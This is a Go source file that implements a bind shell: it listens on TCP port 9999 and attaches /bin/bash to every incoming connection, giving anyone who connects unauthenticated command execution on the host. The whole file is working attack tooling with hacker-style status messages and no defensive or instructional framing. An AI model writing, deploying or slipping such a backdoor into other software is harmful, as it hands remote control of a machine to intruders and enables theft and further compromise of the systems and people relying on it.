package main

import (
	"fmt"
	"net"
	"os/exec"
)

func handleConnection(conn net.Conn) {

	_, err := conn.Write([]byte("[+] session established\n"))
	if err != nil {
		fmt.Printf("[-] session failed %v", err)
	}

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()
	if err != nil {
		fmt.Printf("[-] connection closed.")
	}

	defer conn.Close()
}

func main() {
	fmt.Println("[*] opening port 9999")

	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		fmt.Printf("[-] listener failed, %v", err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Printf("[-] connection failed %v", err)
		}
		go handleConnection(conn)
	}

}
